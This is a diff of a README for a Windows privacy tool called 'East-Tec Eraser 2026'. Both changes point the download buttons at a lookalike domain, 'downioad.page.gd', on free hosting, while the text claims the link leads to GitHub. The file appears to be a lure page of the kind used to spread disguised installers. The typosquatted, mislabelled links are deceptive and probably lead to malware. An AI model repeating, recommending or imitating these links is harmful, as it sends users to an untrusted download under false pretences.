@@ -2,7 +2,7 @@
 
 East-Tec Eraser 2026 is a comprehensive Windows desktop tool designed for secure data sanitization and privacy protection. It provides advanced features to permanently delete sensitive files, clean browser traces, and manage system privacy settings. This suite is optimized for Windows 10 and Windows 11, ensuring a reliable and user-friendly experience for all users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -74,6 +74,6 @@ East-Tec Eraser 2026 is provided as-is for educational and personal use. Users a
 
 Get the latest version of East-Tec Eraser 2026 from the official download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026. This README is for version 2026, and all content is accurate as of the current release.
